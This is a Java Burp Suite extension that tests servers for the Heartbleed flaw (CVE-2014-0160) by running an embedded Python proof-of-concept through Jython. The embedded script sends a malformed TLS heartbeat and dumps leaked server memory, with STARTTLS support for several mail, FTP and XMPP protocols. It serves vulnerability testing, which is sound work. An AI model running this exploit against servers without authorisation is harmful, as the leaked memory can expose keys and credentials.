package burp;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.StringWriter;
import java.util.Arrays;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import javax.swing.JComboBox;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;

import org.python.core.PyString;
import org.python.core.PySystemState;
import org.python.util.PythonInterpreter;

/**
 * Heartbleed extension for burp suite.
 * This extension uses "https://gist.github.com/takeshixx/10107280" which is
 * written by takeshix, to test a server against heartbleed bug.
 * @author Ashkan Jahanbakhsh
 *
 */

public class HeartBleed implements IMenuItemHandler, ITab, ActionListener {
	@SuppressWarnings("unused")
	private IBurpExtenderCallbacks callbacks;
	private JPanel main; 
	private JPanel menu;
	private JTabbedPane tPane;
	private JComboBox<String> tabs;
	private final String TAB_NAME = "Heartbleed";
	private final int DEFAULT_PORT = 443;
	
	public HeartBleed(IBurpExtenderCallbacks callbacks) {
		this.callbacks = callbacks;
		callbacks.setExtensionName("OpenSSL Heartbleed Bug");
		main = new JPanel(new BorderLayout());
		menu = new JPanel();
		menu.setPreferredSize(new Dimension(0, 500));
		tPane = new JTabbedPane();
		main.add(menu, BorderLayout.LINE_START);
		main.add(tPane, BorderLayout.CENTER);
		callbacks.customizeUiComponent(main);
		tabs = new JComboBox<String>();
		callbacks.addSuiteTab(HeartBleed.this);
	}

	@Override
	public void menuItemClicked(String arg0, final IHttpRequestResponse[] arg1) {
		JTextField p = new JTextField();
		p.setText(DEFAULT_PORT + "");
		JTextField s = new JTextField();
		Object[] message = {
		    "Port [Default 443]", p,
		    "StartTLS: smtp|pop3|imap|ftp|xmpp [Optional]", s
		};
		int val = JOptionPane.showConfirmDialog(null, message, "Input", JOptionPane.OK_CANCEL_OPTION);
		if (val != JOptionPane.OK_OPTION) {
			return;
		}
		//String inpPort = JOptionPane.showInputDialog("Enter port number for " + arg1[0].getHost(), DEFAULT_PORT);
		int portNumber = DEFAULT_PORT;
		boolean parsable = true;
		try{
			portNumber = Integer.parseInt(p.getText());
		}catch(NumberFormatException e){
			parsable = false;
		}
		if(!parsable){
			portNumber = DEFAULT_PORT;
		}
		final int port = portNumber;
		final String starttls = s.getText();
		try {
			if (arg1[0].getHost() != null) {

				SwingUtilities.invokeLater(new Runnable() {
					@Override
					public void run() {
						prepareSslTest("[*] Testing " + arg1[0].getHost() + ":" + port +  " against heartbleed bug.", arg1[0].getHost(), port, starttls);
					}
				});
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
	/**
	 * Create a tab in burp send and start the test in a separate thread.
	 * @param value
	 * @param host
	 * @param port
	 */

	private void prepareSslTest(String value, final String host, final int port, final String starttls) {
		final JTextArea serverTab = new JTextArea(5, 30);
		serverTab.setEditable(false);
		serverTab.setText(value);
		JScrollPane scrollWindow = new JScrollPane(serverTab);
		scrollWindow.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		scrollWindow.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollWindow.setPreferredSize(tPane.getSize());
		serverTab.setBounds(tPane.getBounds());
		tabs.addItem(host);
		tPane.addTab(host, scrollWindow);
		tPane.setTabComponentAt(tPane.getTabCount() - 1,new Tab(tPane, this));

		Thread thread = new Thread() {
			public void run() {
				serverTab.append("\n");
				final String output = makeItBleed(host, port + "", starttls);
				serverTab.append(output);
			}
		};
		thread.start();
		

	}

	@Override
	public String getTabCaption() {
		return TAB_NAME;
	}

	@Override
	public Component getUiComponent() {
		return main;
	}

	/**
	 * Remove tab.
	 * @param index
	 */
	public void RemoveTab(int index) {
		String name = tPane.getTitleAt(index);
		tabs.removeItem(name);
		tPane.remove(index);
	}

	@Override
	public void actionPerformed(ActionEvent e) {
	}

	/**
	 * Call python script by jython.
	 * @param host
	 * @param port
	 * @return
	 */
	private String makeItBleed(final String host, final String port, final String starttls) {
		final String prog = "#!/usr/bin/env python2\n" +
				"\n" +
				"#Author: takeshix <takeshix@adversec.com>\n" +
				"#PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).\n" +
				"#Thanks to Derek Callaway (decal@ethernet.org) for contributing various STARTTLS scenarios.\n" +
				"#Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.\n" +
				"#Modified by Ashkan Jahanbakhsh to make it burp friendly \n" +
				"#Leaked memory can be dumped directly into an outfile.\n" +
				"\n" +
				"import sys,struct,socket\n" +
				"from argparse import ArgumentParser\n" +
				"\n" +
				"\n" +
				"tls_versions = {0x00:'TLSv1,3' ,0x03:'TLSv1.2',0x02:'TLSv1.1',0x01:'TLSv1.0'}\n" +
				"\n" +
				"def info(msg):\n" +
				"    print '[+] {}'.format(msg)\n" +
				"\n" +
				"def error(msg):\n" +
				"    print '[ - ] {}'.format(msg)\n" +
				"    run = False\n" +
				"\n" +
				"def debug(msg):\n" +
				"    if opts.debug: print '	[+] {}'.format(msg)\n" +
				"\n" +
				"def parse_cl():\n" +
				"    global opts\n" +
				"    parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\n" +
				"    parser.add_argument('host', help='IP or hostname of target system')\n" +
				"    parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')\n" +
				"    parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')\n" +
				"    parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default='', help='Check STARTTLS')\n" +
				"    parser.add_argument('-d', '--debug', action='store_true', default='True', help='Enable debug output')\n" +
				"    opts = parser.parse_args()\n" +
				"\n" +
				"\n" +
				"def hex2bin(arr):\n" +
				"    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')\n" +
				"\n" +
				"def build_client_hello(tls_ver):\n" +
				"    client_hello = [\n" +
				"# TLS header ( 5 bytes)\n" +
				"0x16,               # Content type (0x16 for handshake)\n" +
				"0x03, tls_ver,         # TLS Version\n" +
				"0x00, 0xdc,         # Length\n" +
				"# Handshake header\n" +
				"0x01,               # Type (0x01 for ClientHello)\n" +
				"0x00, 0x00, 0xd8,   # Length\n" +
				"0x03, tls_ver,         # TLS Version\n" +
				"# Random (32 byte)\n" +
				"0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,\n" +
				"0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,\n" +
				"0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,\n" +
				"0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,\n" +
				"0x00,               # Session ID length\n" +
				"0x00, 0x66,         # Cipher suites length\n" +
				"# Cipher suites (51 suites)\n" +
				"0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,\n" +
				"0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,\n" +
				"0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,\n" +
				"0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,\n" +
				"0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,\n" +
				"0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,\n" +
				"0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,\n" +
				"0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,\n" +
				"0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,\n" +
				"0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,\n" +
				"0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,\n" +
				"0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,\n" +
				"0x00, 0x06, 0x00, 0x03, 0x00, 0xff,\n" +
				"0x01,               # Compression methods length\n" +
				"0x00,               # Compression method (0x00 for NULL)\n" +
				"0x00, 0x49,         # Extensions length\n" +
				"# Extension: ec_point_formats\n" +
				"0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,\n" +
				"# Extension: elliptic_curves\n" +
				"0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,\n" +
				"0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,\n" +
				"0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,\n" +
				"0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,\n" +
				"0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,\n" +
				"0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,\n" +
				"0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,\n" +
				"# Extension: SessionTicket TLS\n" +
				"0x00, 0x23, 0x00, 0x00,\n" +
				"# Extension: Heartbeat\n" +
				"0x00, 0x0f, 0x00, 0x01, 0x01\n" +
				"    ]\n" +
				"    return client_hello\n" +
				"\n" +
				"def build_heartbeat(tls_ver):\n" +
				"    heartbeat = [\n" +
				"0x18,       # Content Type (Heartbeat)\n" +
				"0x03, tls_ver,  # TLS version\n" +
				"0x00, 0x03,  # Length\n" +
				"# Payload\n" +
				"0x01,       # Type (Request)\n" +
				"0x40, 0x00  # Payload length\n" +
				"    ]\n" +
				"    return heartbeat\n" +
				"\n" +
				"def hexdump(s):\n" +
				"    for b in xrange(0, len(s), 16):\n" +
				"        lin = [c for c in s[b : b + 16]]\n" +
				"        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n" +
				"        if((b % 14) != 0): sys.stdout.write(pdat)\n" +
				"        else: print '%s' % (pdat)\n" +
				"    print\n" +
				"\n" +
				"def rcv_tls_record(s):\n" +
				"    try:\n" +
				"        tls_header = s.recv(5)\n" +
				"        if not tls_header:\n" +
				"            typ = 21\n" +
				"            ver = 0x300\n" +
				"            message = ''\n" +
				"            return typ, ver, message\n" +
				"        typ, ver, length = struct.unpack('>BHH',tls_header)\n" +
				"        message = ''\n" +
				"        while len(message) != length:\n" +
				"            message += s.recv(length-len(message))\n" +
				"        if not message:\n" +
				"            error('Unexpected EOF (message)')\n" +
				"            return False\n" +
				"        debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))\n" +
				"        return typ, ver, message\n" +
				"    except Exception as e:\n" +
				"        error(e)\n" +
				"\n" +
				"def main():\n" +
				"    run = True\n" +
				"    parse_cl()\n" +
				"\n" +
        		"    try:\n" +
        		"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
        		"        info('Connecting...')\n" +
        		"        s.connect((opts.host, opts.port))\n" +
        		"    except socket.error, (value,message):\n" +
        		"        if s:\n" +
        		"            print '[ - ] Could not open socket: ' + message\n" +
        		"            s.close()\n"+
        		"        return False\n" +
				"\n" +
        		"    if len(opts.starttls) > 0:\n" +
        		"        BUFSIZE=4096\n" +
        		"        if opts.starttls.lower().strip() == 'smtp':\n" +
        		"            print 'heree???'\n" +
        		"            re = s.recv(BUFSIZE)\n" +
        		"            debug(re)\n" +
        		"            s.send('ehlo starttlstest\\n')\n" +
        		"            re = s.recv(BUFSIZE)\n" +
        		"            debug(re)\n" +
        		"            if not 'STARTTLS' in re:\n" +
        		"                debug(re)\n" +
        		"                error('STARTTLS not supported')\n" +
        		"            s.send('starttls\\n')\n" +
        		"            re = s.recv(BUFSIZE)\n" +
        		"        elif opts.starttls.lower().strip() == 'pop3':\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"            s.send('STLS\\n')\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"        elif opts.starttls.lower().strip() == 'imap':\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"            s.send('STARTTLS\\n')\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"        elif opts.starttls.lower().strip() == 'ftp':\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"            s.send('AUTH TLS\\n')\n" +
        		"            s.recv(BUFSIZE)\n" +
        		"        elif opts.starttls.lower().strip() == 'xmpp':\n" +
        		"            s.send(\"<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\\n\")\n"+
        		"            s.recv(BUFSIZE)\n" +
        		"    \n" +
				"    vulnerable = False\n" +
				"    info('Sending ClientHello')\n" +
				"    info('Sending heartbeat request...')\n" +
				"    for num, tlsver in tls_versions.items():\n" +
				"        if vulnerable:\n" +
				"            break\n" +
				"        Runner = True\n" +
				"        s.send(hex2bin(build_client_hello(num)))\n" +
				"        s.send(hex2bin(build_heartbeat(num)))\n" +
				"        while Runner is True:\n" +
				"            typ, ver, message = rcv_tls_record(s)\n" +
				"            if not typ:\n" +
				"                Runner = False\n" +
				"            if typ is 24:\n" +
				"                if len(message) > 3:\n" +
				"                    hexdump(message)\n" +
				"                    vulnerable = True\n" +
				"                    Runner = False\n" +
				"            if typ is 21:\n" +
				"                Runner = False\n" +
				"    if vulnerable:\n" +
				"        info('Server is vulnerable!')\n" +
				"    else:\n" +
				"        error('Server is not vulnerable!')\n" +
				"\n" +
				"\n" +
				"if __name__ == '__main__':\n" +
				"    main()\n";
		
		final String[] stls = {"smtp", "pop3", "imap", "ftp", "xmpp"};  

	    String outputStr = "[-] Not vulnerable.";
		ExecutorService executor = Executors.newSingleThreadExecutor();
		Future<String> result = executor.submit(new Callable<String>() {
		    public String call() throws Exception {
				PySystemState state = new PySystemState();
				state.argv.append(new PyString(host));
				state.argv.append(new PyString("-p " + port));
				if(!starttls.isEmpty() && Arrays.asList(stls).contains(starttls.toLowerCase())){
					state.argv.append(new PyString("-s " + starttls.toLowerCase()));
				}
				PythonInterpreter python = new PythonInterpreter(null, state);
				StringWriter out = new StringWriter();
				python.setOut(out);				
				python.exec(prog);
				return out.toString();
		    }
		});
		try {
		    return outputStr = result.get();
		} catch (Exception e) {
		}
		
		return outputStr;
	}

}
